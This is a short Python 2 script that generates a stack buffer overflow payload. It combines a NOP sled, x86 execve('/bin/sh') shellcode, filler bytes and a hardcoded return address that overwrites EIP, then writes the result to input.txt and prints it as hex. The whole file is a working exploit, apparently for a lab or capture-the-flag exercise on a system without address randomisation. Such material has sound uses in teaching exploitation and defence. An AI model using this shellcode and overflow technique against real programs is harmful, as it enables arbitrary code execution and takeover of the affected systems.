#!/usr/bin/python 

shell_code = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
nopsled = '\x90' * 116
padding = 'A' * (251 - 116 - 32)

# 0xbffff740
eip = '\x40\xf7\xff\xbf'
r =  nopsled + shell_code + padding + eip
hex_val ='\\x'.join(x.encode('hex') for x in r)

with open("input.txt", "w") as f:
    f.write(r)

print "Generated string:"
print hex_val
